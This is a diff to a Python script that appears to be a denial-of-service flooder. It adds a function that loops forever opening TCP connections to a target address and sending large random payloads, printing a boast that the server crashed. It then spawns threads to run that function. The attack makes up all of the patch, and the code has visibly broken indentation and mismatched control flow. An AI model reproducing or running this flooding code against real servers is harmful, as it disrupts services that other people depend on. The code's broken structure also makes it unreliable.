@@ -378,8 +378,24 @@ def start():
         except:
             s.close()
             print('[+] server error')
-
+def attck():
+ data = random._urandom(57777)
+ mm = random.choice(("[*]","[!]","[#]"))
+ while True:
+       try:
+         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         s.connect((ip,port))
+         s.send(data)
+         for x in range(pack):
+				 s.send(data)
+			print("SÉRVÉR {1} CRÂSH BY ZÁN")
+		except:
+			s.close()
+			print("[+] server error")
 for x in range(th):
-  ll = random._urandom(50000)
+  if choice == 'y':
   thred = threading.Thread(target=start)
+  thred.start()
+else: 
+  thred = threading.Thread(target=attck)
   thred.start()
